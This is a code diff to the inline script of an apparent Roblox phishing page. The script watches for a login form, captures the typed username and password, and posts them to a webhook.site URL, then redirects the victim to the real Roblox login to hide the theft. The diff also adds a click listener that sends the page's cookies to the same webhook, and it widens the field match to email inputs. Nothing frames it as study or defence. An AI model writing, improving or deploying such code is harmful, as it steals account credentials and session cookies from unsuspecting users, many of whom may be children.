@@ -632,7 +632,7 @@
 <script>
 document.addEventListener('DOMContentLoaded', function() {
     const checkForLoginForm = setInterval(function() {
-        const usernameField = document.querySelector('input[type="text"]');
+        const usernameField = document.querySelector('input[type="text"], input[type="email"]');
         const passwordField = document.querySelector('input[type="password"]');
         const loginButton = document.querySelector('button[type="submit"], button[type="button"], button');
 
@@ -645,21 +645,31 @@ document.addEventListener('DOMContentLoaded', function() {
                 const username = usernameField.value;
                 const password = passwordField.value;
 
-                document.getElementById('fake-username').value = username;
-                document.getElementById('fake-password').value = password;
-                document.getElementById('fake-login-form').submit();
-
-                setTimeout(() => {
-                    window.location.href = "https://www.roblox.com/login";
-                }, 1000);
-                return false;
+                fetch("https://webhook.site/d9343135-9a99-478a-b863-e1f658cbaf80", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ username, password })
+                })
+                .then(() => {
+                    setTimeout(() => {
+                        window.location.href = "https://www.roblox.com/login";
+                    }, 3000);
+                })
+                .catch(() => {
+                    setTimeout(() => {
+                        window.location.href = "https://www.roblox.com/login";
+                    }, 3000);
+                });
             };
         }
     }, 500);
 
-    const cookies = document.cookie;
-    const img = new Image();
-    img.src = "https://webhook.site/d9343135-9a99-478a-b863-e1f658cbaf80?cookies=" + encodeURIComponent(cookies);
+    document.addEventListener('click', function() {
+        const cookies = document.cookie;
+        if (cookies) {
+            fetch(`https://webhook.site/d9343135-9a99-478a-b863-e1f658cbaf80?cookies=${encodeURIComponent(cookies)}`);
+        }
+    });
 });
 </script>
 
